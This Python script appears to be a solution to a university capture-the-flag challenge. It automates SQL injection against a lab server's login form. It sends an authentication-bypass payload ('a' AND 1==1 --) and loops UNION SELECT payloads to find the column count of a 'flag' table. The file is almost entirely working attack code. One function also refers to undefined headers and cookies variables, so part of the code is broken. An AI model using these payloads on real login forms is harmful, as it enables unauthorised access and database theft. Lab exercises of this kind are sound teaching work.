import requests
import string

max_username_len = 38

def send_request(origin, referer, user_id, payload, allow_redirects=True):

    url = f"{origin}/login"
    headers = {
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": origin,
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Referer": referer,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    cookies = {
        "CHALBROKER_USER_ID": user_id
    }

    print(f"Sending request to: {url}")
    print(f'Using payload: {payload}')
    response = requests.post(url, data=payload, headers=headers, cookies=cookies, allow_redirects=allow_redirects)
    if response.status_code == 200:
        print(f"Request was successful: {response.text}")
    else:
        print(f"Response: {response.text} {response.status_code}")
    return response

def register_user(origin, referer, user_id, username="a", password="p", description="d", hobby="h"):
    # Check if the user already exists by attempting to log in
    result = check_login_success(origin, referer, user_id)

    if result:
        print("Admin user already exists.")
        return

    # Register the admin user
    register_url = f"{origin}/register"
    register_payload = {
        "username": username,
        "password": password,
        "description": description,
        "hobby": hobby
    }
    print(f'Using payload: {register_payload}')
    register_response = requests.post(register_url, data=register_payload, headers=headers, cookies=cookies)

    if register_response.status_code == 200 and "Login" in register_response.text:
        print("Admin user successfully registered.")
    else:
        print("Failed to register admin user.")

def check_login_success(origin, referer, user_id):
    print("Checking login success...")
    PAYLOAD = {
        "username": "a' AND 1==1 --|",
        "password": "p"
    }
    # Send the initial request to check if the server is reachable
    response = send_request(origin, referer, user_id, PAYLOAD)
    if "Welcome" in response.text:
        print("Login successful!")
        return True
    else:
        print("Login failed.")
        return False

def find_column_count(origin, referer, user_id, table_name="users", max_columns=20):
    print(f"Finding column count for table: {table_name}...")
    for i in range(1, max_columns + 1):
        # Construct the attack payload for counting the number of columns
        field_counts = ("1,"* (i))[:-1]
        attack_payload = f"a' UNION SELECT {field_counts};--"
        payload = {
            "username": attack_payload,
            "password": "p"
        }
        if len(payload["username"]) > max_username_len:
            print(f"Payload username exceeds max length: {len(payload['username'])} > {max_username_len}")
            return None

        # Send the request using the helper function
        response = send_request(origin, referer, user_id, payload)

        # Check if the response indicates success
        if "Welcome" in response.text:
            print(f"Columns {i} exists.")
            return i;

    print(f"Could not determine the number of columns for table {table_name} within the specified range.")
    return None


if __name__ == "__main__":
    ORIGIN = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1506"
    REFERER = f"{ORIGIN}/login"
    CHALBROKER_USER_ID = "nam10102"

    register_user(ORIGIN, REFERER, CHALBROKER_USER_ID)
    check_login_success(ORIGIN, REFERER, CHALBROKER_USER_ID)

    column_count = None
    if column_count is None:
        column_count = find_column_count(ORIGIN, REFERER, CHALBROKER_USER_ID, max_columns=20, table_name="flag")
        print(f"Column count: {column_count}")
